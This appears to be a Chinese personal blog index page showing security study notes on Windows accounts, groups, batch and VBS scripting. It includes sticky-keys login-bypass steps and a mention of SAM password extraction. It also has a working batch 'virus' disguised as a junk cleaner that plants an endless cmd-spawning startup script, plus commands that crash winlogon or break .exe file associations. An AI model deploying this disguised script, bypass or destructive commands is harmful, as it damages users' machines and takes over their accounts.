<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="ahhhhhhhhh~~~">
<meta property="og:type" content="website">
<meta property="og:title" content="❄">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="❄">
<meta property="og:description" content="ahhhhhhhhh~~~">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="icSnow">
<meta property="article:tag" content="Crypto,Coder">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>❄</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">❄</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Snow`s Blog</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="icSnow"
      src="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
  <p class="site-author-name" itemprop="name">icSnow</p>
  <div class="site-description" itemprop="description">ahhhhhhhhh~~~</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">17</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/29/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-4-%E7%94%A8%E6%88%B7%EF%BC%8C%E7%BB%84%E7%AE%A1%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/29/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-4-%E7%94%A8%E6%88%B7%EF%BC%8C%E7%BB%84%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">网安学习-D-4-用户，组管理</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-05-29 20:08:10 / 修改时间：22:49:26" itemprop="dateCreated datePublished" datetime="2022-05-29T20:08:10+08:00">2022-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>每个用户有自己唯一的 SID（安全标识符），window 系统，通过命令 ：<code>wmic useraccount get name,sid</code> 查看</p>
<blockquote>
<p>windows 管理员 administrator 的 UID 是 500，普通用户 1000 开始</p>
<p>linux 管理员 root 的UID是 0 ，普通用户是1000开始</p>
</blockquote>
<p><img src="https://ossimg.yzitc.com/2022/05/29/15a458e7e437a.png"></p>
<p>windows ，账号密码存储的位置 ：<code>C:\windows\system32\config\SAM</code> 如果通过一定办法拿到 SAM 文件，并暴力搜索可以获得账号密码。</p>
<h3 id="插曲"><a href="#插曲" class="headerlink" title="插曲"></a>插曲</h3><p>0..0 本机尝试使用 mimikatz来读取SAM数据库，但win7虚拟机下无法下载 mimikatz，尝试使用 Vmware tools 但 win7 由于 认证问题无法安装，尝试办法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/teisite/article/details/117675403">解决VMware16在虚拟机Windows7下安装VMware tools问题</a> 未成功；尝试将搭建 win7 与 主机的 ftp 连接，传输 mimikatz 压缩包，待续…</p>
<p>以上所需步骤：</p>
<ol>
<li>搭建主机与虚拟机（win7+）ftp连接；</li>
<li>将 mimikatz 传输至虚拟机；</li>
<li>使用 mimikatz 通过以下参考获取账户密码。</li>
</ol>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SHENNONGZHAIZHU/article/details/52435519">Windows中的SAM文件</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/108149449?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%88%B0%20SAM%20%E6%96%87%E4%BB%B6&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-108149449.142^v11^pc_search_result_control_group,157^v12^control&amp;spm=1018.2226.3001.4187">sam文件获取与解密</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xddtrue/article/details/116596500?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;utm_relevant_index=5">通过SAM文件获取windows7密码</a></p>
<blockquote>
<p>system 系统账户，权限至高无上</p>
<p>local services 本地服务账户 普通权限</p>
<p>network services 网络服务账户 普通权限</p>
</blockquote>
<p>关于用户的一些简单 dos 命令：(切换到管理员用户下CMD)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">net user 账户名 字符串   <span class="comment">#修改密码</span></span><br><span class="line">net user 账户名         <span class="comment">#查看账户信息</span></span><br><span class="line">net user 账户名 密码 /add  <span class="comment">#新建账户</span></span><br><span class="line">net user 账户名 /del  <span class="comment">#删除账户</span></span><br><span class="line">net user 账户名 /active:<span class="built_in">yes</span>/no  <span class="comment">#激活或禁用账户</span></span><br></pre></td></tr></table></figure>
<h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p>组的作用：简化权限赋予</p>
<p>赋权限方式：</p>
<p>1)用户 - 组-赋权限</p>
<p>2)用户-赋权限</p>
<p>内置组（系统自带组）</p>
<p>内置组的权限已经被系统赋予</p>
<blockquote>
<p>administrators      #管理员组<br>guests             #来宾组<br>users              #普通用户组<br>network            #网络配置组<br>print              #打印机组<br>Remote Desktop     #远程桌面组</p>
</blockquote>
<p>简单的关于组的 dos 命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net localgroup     <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名    <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名 /add     <span class="comment">#创建组</span></span><br><span class="line">net localgroup 组名 用户名 /add   <span class="comment">#添加组成员	(成员需要存在，net user new_user /add)</span></span><br><span class="line">net localgroup 组名 用户名 /del   <span class="comment">#删除组成员</span></span><br><span class="line">net localgroup 组名 /del       <span class="comment">#删除组</span></span><br></pre></td></tr></table></figure>
<p>@@</p>
<p>服务器远程管理</p>
<p>图形化远程管理</p>
<p>运行 ：“mstsc”</p>
<p>telnet（命令行）\</p>
<p>查看本地上所有开放的端口 cmd “netstat -an”</p>
<p>telnet：23</p>
<p>远程桌面协议RDP：3389</p>
<p>@@</p>
<p>//没做呢//</p>
<h2 id="5-次-shift-的-win7-小漏洞"><a href="#5-次-shift-的-win7-小漏洞" class="headerlink" title="5 次 shift 的 win7 小漏洞"></a>5 次 shift 的 win7 小漏洞</h2><p>基本思路：</p>
<p>在 win 7 登录界面按 5 次 shift 可以会启动 sethc 程序，尝试将该程序换成 cmd.exe 就可以使用命令更改用户密码。</p>
<p>步骤：</p>
<blockquote>
<ol>
<li>win 7 断电</li>
<li>启动时进入系统修复界面（如果没出现修复选项，启动时按 F8）</li>
<li>修复是出现系统还原选择取消，出现“无法修复”的弹窗时，点击查看问题详情会出现一个内部声明（该声明在系统磁盘内，是一个进入系统修改文件的口子。</li>
<li>点进文档，另存为会出现文件目录，找到 <code>c:\windows\system32</code>目录，将 sethc 程序改名，cmd 程序复制改成 sethc。</li>
<li>重启系统，在输密码界面再次 5 次 shift，就会启动 cmd（管理员） 而非 sethc，通过命令修改用户密码</li>
</ol>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/Cryptanalysis/%E6%9C%89%E9%99%90%E5%9F%9F%E4%B8%8A%E7%9A%84%E8%BF%90%E7%AE%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/27/Cryptanalysis/%E6%9C%89%E9%99%90%E5%9F%9F%E4%B8%8A%E7%9A%84%E8%BF%90%E7%AE%97/" class="post-title-link" itemprop="url">有限域上的运算</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-27 23:37:48" itemprop="dateCreated datePublished" datetime="2022-05-27T23:37:48+08:00">2022-05-27</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/" class="post-title-link" itemprop="url">网安学习-D-3-批处理，脚本，过时小病毒</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-27 22:22:57" itemprop="dateCreated datePublished" datetime="2022-05-27T22:22:57+08:00">2022-05-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-05-29 20:00:30" itemprop="dateModified" datetime="2022-05-29T20:00:30+08:00">2022-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>环境：win2003 虚拟机</p>
<p>只做简单了解，并不深究…</p>
<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
<p>使用的是 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
<p><strong>发布博客的批处理文件</strong></p>
<p>我自己的：</p>
<ol>
<li>push</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
<ol>
<li>check</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<p>3.NewBlog</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
<p><strong>一个小例子</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
<p>如：</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
<ul>
<li>添加 开机自启动项，无限弹窗</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
<p>ntsd    ：杀死进程</p>
<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
<p>winlogon.exe    ：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
<ul>
<li>修改文件关联，使无法打开（前一章写过）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-2-ip%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
